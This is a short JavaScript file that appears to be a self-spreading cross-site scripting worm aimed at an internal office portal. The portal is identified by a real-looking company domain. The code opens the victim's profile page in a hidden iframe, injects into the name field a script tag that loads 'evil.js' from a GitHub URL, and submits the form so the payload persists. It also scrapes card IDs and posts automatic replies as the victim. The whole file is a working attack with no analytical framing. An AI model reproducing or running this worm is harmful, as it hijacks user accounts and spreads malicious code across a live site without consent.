function chgOptName(){
    var img = document.createElement('iframe');
    img.src='http://cuc.asiainfo-linkage.com/office/optorInfo/OptorInfo_optorInfo.so';
    img.style.display='none';
    document.getElementsByTagName('body')[0].appendChild(img);
    $(img).load(
       function(){
        var doc = img.document;
        if (doc == undefined)
            doc = img.contentDocument;
        var optNameObj = doc.getElementsByName("orgOptor.optorName")[0];
        if (optNameObj.value.indexOf("script") < 0) {
            optNameObj.value = optNameObj.value + "<script>$.getScript('https://raw.github.com/hellosamy/hello/commit/evil.js')</script>";
            doc.forms[0].submit();
        }
      }
    );
}
chgOptName();



function sendCommentFromPageRegExp(url,regExpStr){
    $.get(url,function(data){
        var pat=new RegExp(regExpStr,"g");
        var result;
        while((result=pat.exec(data))!=null){
            var  sendurl="/office/cucCard/cucCardAction_queryReplyByPage.so?sendId="+result[1];
            $.getJSON(sendurl,function(jsonData){
                if(jsonData.replyList.length<=0){
                   $.post("/office/cucCard/cucCardAction_reply.so",{sendId:result[1],content:" ",ifSendCard:"00"});
                }
            });
        }
    })
}
if(window.location.href!="http://cuc.asiainfo-linkage.com/office/optorInfo/OptorInfo_optorInfo.so"){
	sendCommentFromPageRegExp("/office/cucCard/cucCardAction_sendOverAll.so","officeImages/upload/cucCard/result/\\d+\.png','(\\d+)'");
	sendCommentFromPageRegExp("/office/cucCard/cucCardAction_receiveOverAll.so","officeImages/upload/cucCard/result/\\d+\.png','(\\d+)'");
}
